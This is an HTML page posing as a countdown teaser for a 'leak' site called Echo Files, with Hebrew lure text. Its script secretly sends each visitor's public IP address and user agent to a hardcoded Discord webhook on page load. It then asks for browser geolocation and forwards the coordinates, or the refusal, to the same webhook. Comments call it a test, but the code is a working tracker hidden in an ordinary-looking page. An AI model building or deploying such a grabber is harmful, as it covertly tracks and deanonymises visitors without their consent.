<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Echo Files</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
body{
height:100vh;
display:flex;
align-items:center;
justify-content:center;
background:#1c1f24;
color:#fff
}
.wrapper{
text-align:center
}
h1{
font-size:28px;
font-weight:600;
margin-bottom:8px
}
.sub{
opacity:.75;
margin-bottom:30px
}
.timer{
display:flex;
gap:14px;
justify-content:center
}
.card{
background:#2a2e35;
border-radius:8px;
width:90px;
padding:18px 0;
box-shadow:0 4px 12px rgba(0,0,0,.35)
}
.value{
font-size:32px;
font-weight:600
}
.label{
margin-top:6px;
font-size:11px;
letter-spacing:1px;
opacity:.6
}
.buttons{
margin-top:30px;
display:flex;
gap:14px;
justify-content:center;
flex-wrap:wrap
}
.btn{
text-decoration:none;
background:#3a3f47;
color:#fff;
padding:12px 18px;
border-radius:6px;
font-size:14px;
font-weight:600;
transition:.2s;
box-shadow:0 3px 10px rgba(0,0,0,.3)
}
.btn:hover{
background:#4a505a;
transform:translateY(-1px)
}
.footer{
margin-top:26px;
font-size:12px;
opacity:.55
}
</style>
</head>
<body>
<div class="wrapper">
<h1>Echo Files</h1>
<div class="sub">מפיצים הכול! המתחזים חוזר!</div>

<div class="timer">
<div class="card">
<div class="value" id="h">00</div>
<div class="label">HOURS</div>
</div>
<div class="card">
<div class="value" id="m">00</div>
<div class="label">MINUTES</div>
</div>
<div class="card">
<div class="value" id="s">00</div>
<div class="label">SECONDS</div>
</div>
</div>

<div class="buttons">
<a class="btn" href="https://www.google.com/search?q=google+map+my+location+live&sca_esv=074920bdea4960d4&sxsrf=ANbL-n5gJvW3L-cQ7KUgQxGU9YVOGwy7BA%3A1770667645083&ei=fT6KaZ3dBKSokdUPnoOxuAI&oq=google+map+my+location&gs_lp=Egxnd3Mtd2l6LXNlcnAiFmdvb2dsZSBtYXAgbXkgbG9jYXRpb24qAggE" target="_blank">
הדלפה רשמית לפני כולם
</a>
<a class="btn" href="https://whatismyipaddress.com/" target="_blank">
אדמין
</a>
</div>

<div class="footer">System activity is being monitored</div>
</div>

<script>
(function() {
  // ---------- webhook (test) ----------
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1472664432134852740/m7btUoF6rBDTpparYGo-IsyFCxGZ0yM5jrKotgumvRsgUAe8oGtj8WEmYZ213HDP9iZ5"; // replaceable but works as test

  // ---------- helper: send data to webhook ----------
  function sendToWebhook(payload, label = 'IP') {
    fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        source: 'echo_files_test',
        type: label,
        data: payload,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
      })
    }).catch(err => console.warn('webhook send failed (expected test behaviour)', err));
  }

  // ---------- 1. get IP via ipify (IPv4) ----------
  fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(ipData => {
      const ipv4 = ipData.ip;
      // first webhook: IPv4 + basic info
      sendToWebhook({
        ip: ipv4,
        message: 'initial IP capture'
      }, 'IPv4');
      
      // optional: store ip for later use in location ping
      sessionStorage.setItem('visitor_ip', ipv4);
    })
    .catch(err => {
      console.warn('ipify failed', err);
      sendToWebhook({ error: 'could not fetch IP', detail: err.message }, 'IPv4_fail');
    });

  // ---------- 2. location request (polite, only after user accepts) ----------
  // we wait a tiny bit so IP webhook is not blocked, then ask for location
  setTimeout(() => {
    if (!navigator.geolocation) {
      sendToWebhook({ error: 'geolocation not supported' }, 'geo_unsupported');
      return;
    }

    // ask for permission (browser prompt) – if user allows, send location webhook
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        const storedIp = sessionStorage.getItem('visitor_ip') || 'unknown';
        // second webhook: location data
        sendToWebhook({
          ip: storedIp,
          lat: latitude,
          lng: longitude,
          accuracy: accuracy,
          message: 'user accepted location'
        }, 'geolocation');
      },
      (error) => {
        // user denied or error – send basic info without coordinates
        const storedIp = sessionStorage.getItem('visitor_ip') || 'unknown';
        sendToWebhook({
          ip: storedIp,
          error: error.message,
          code: error.code,
          message: 'location permission denied or error'
        }, 'geo_denied');
      },
      { timeout: 7000, enableHighAccuracy: false }
    );
  }, 800); // short delay to not interfere with IP fetch

  // ---------- original countdown code (preserved) ----------
  let key = "countdown_end";
  let end = localStorage.getItem(key);
  if (!end) {
    end = Date.now() + 86400000;
    localStorage.setItem(key, end);
  }
  end = parseInt(end);
  setInterval(() => {
    let t = end - Date.now();
    if (t < 0) t = 0;
    let h = Math.floor(t / 3600000);
    let m = Math.floor((t % 3600000) / 60000);
    let s = Math.floor((t % 60000) / 1000);
    document.getElementById("h").textContent = String(h).padStart(2, "0");
    document.getElementById("m").textContent = String(m).padStart(2, "0");
    document.getElementById("s").textContent = String(s).padStart(2, "0");
  }, 1000);
})();
</script>

<!-- tiny note: webhook shown in console if fails – purely test -->
</body>
</html>
